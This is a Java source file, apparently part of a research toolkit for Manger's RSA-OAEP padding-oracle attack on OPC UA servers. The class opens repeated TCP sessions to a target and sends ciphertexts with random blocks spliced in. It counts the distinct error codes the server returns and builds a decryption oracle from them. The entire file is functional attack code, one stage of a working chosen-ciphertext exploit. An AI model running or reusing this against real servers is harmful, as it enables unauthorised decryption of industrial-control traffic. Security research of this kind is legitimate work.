package attacks.manger.oracle.learner;

import attacks.CipherTextHelper;
import attacks.manger.oracle.DistinguishableErrorOracle;
import attacks.manger.oracle.OracleException;
import opcua.context.Context;
import opcua.message.ErrorMessage;
import opcua.message.HelloMessage;
import opcua.message.Message;
import opcua.message.parts.MessageType;
import opcua.util.MessageReceiver;
import opcua.util.MessageSender;
import transport.tcp.ClientTcpConnection;

import java.io.IOException;
import java.security.SecureRandom;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class ErrorCodeOracleLearner extends OracleLearner {

    private final Context context;
    private final byte[] validCipherText;


    public ErrorCodeOracleLearner(Context context, byte[] validCipherText) {
        this.context = context;
        this.validCipherText = validCipherText;
    }

    @Override
    public LearningResult learn(int rounds) throws OracleException {
        byte[] cipherText = Arrays.copyOf(validCipherText, validCipherText.length);
        int cipherBlockLength = ((RSAPublicKey) context.getRemoteCertificate().getPublicKey()).getModulus().bitLength() / 8;
        int blockOffset;
        try {
            blockOffset = CipherTextHelper.getOpnBlockOffset(cipherText, (RSAPublicKey) context.getRemoteCertificate().getPublicKey());
        } catch (IOException e) {
            throw new OracleException("Unable to compute block offset", e);
        }
        byte[] randomCipherBlock = new byte[cipherBlockLength];
        SecureRandom secureRandom = new SecureRandom();

        //We save the number of responses with each individual error code in a map
        Map<Long, Integer> errorCodeFrequencies = new HashMap<>();

        for(int i = 0; i < rounds; i++) {
            //Insert a random cipher block into the valid cipher text
            secureRandom.nextBytes(randomCipherBlock);
            CipherTextHelper.insertCipherBlock(cipherText, randomCipherBlock, blockOffset, cipherBlockLength, 0);

            //Send resulting cipher text to server and evaluate output
            ClientTcpConnection connection = new ClientTcpConnection(context.getRemoteHostname(), context.getRemotePort(), 3000);
            context.setConnection(connection);
            try {
                connection.initialize();
                MessageSender.sendMessage(new HelloMessage(0, 8192, 8192, 8192, 256, context.getEndpointUrl()), context);
                Message ack = MessageReceiver.receiveMessage(context);
                if(ack == null || ack.getMessageType() != MessageType.ACK) {
                    throw new OracleException("Unable to establish TCP connection");
                }

                MessageSender.sendBytes(cipherText, context);
                Message response = MessageReceiver.receiveMessage(context);

                if(response != null && response.getMessageType() == MessageType.ERR) {
                    ErrorMessage error = (ErrorMessage)response;
                    long errorCode = error.getError();
                    //Update frequencies
                    if(!errorCodeFrequencies.containsKey(errorCode)) {
                        errorCodeFrequencies.put(errorCode, 0);
                    }
                    errorCodeFrequencies.replace(errorCode, errorCodeFrequencies.get(errorCode) + 1);
                }

                connection.close();
            }
            catch (IOException e) {
                throw new OracleException(e);
            }
        }

        //Find the the two most frequent error codes
        Map.Entry<Long, Integer> most = null, secondMost = null;
        for(Map.Entry<Long, Integer> entry : errorCodeFrequencies.entrySet()) {
            if(most == null || entry.getValue() > most.getValue()) {
                secondMost = most;
                most = entry;
            } else {
                if(secondMost == null || entry.getValue() > secondMost.getValue()) {
                    secondMost = entry;
                }
            }
        }

        if(most == null || secondMost == null) {
            throw new OracleException("Unable to learn oracle");
        }

        //Calculate confidence level
        double deviation1 = Math.abs(((double)most.getValue() / rounds) - (255.0/256));
        double deviation2 = Math.abs(((double)secondMost.getValue() / rounds) - (1.0/256));
        double confidence = 1 - ((deviation1 + deviation2) / 2);

        //Build oracle
        Map.Entry<Long, Integer> errorCodeLessThanB = secondMost;
        try {
            DistinguishableErrorOracle oracle = new DistinguishableErrorOracle(
                    context,
                    (ErrorMessage msg) -> msg.getError() == errorCodeLessThanB.getKey(),
                    validCipherText,
                    0
            ); //TODO: BLock number

            return new LearningResult(oracle, confidence);

        } catch (IOException e) {
            throw new OracleException("Unable to build oracle", e);
        }
    }
}
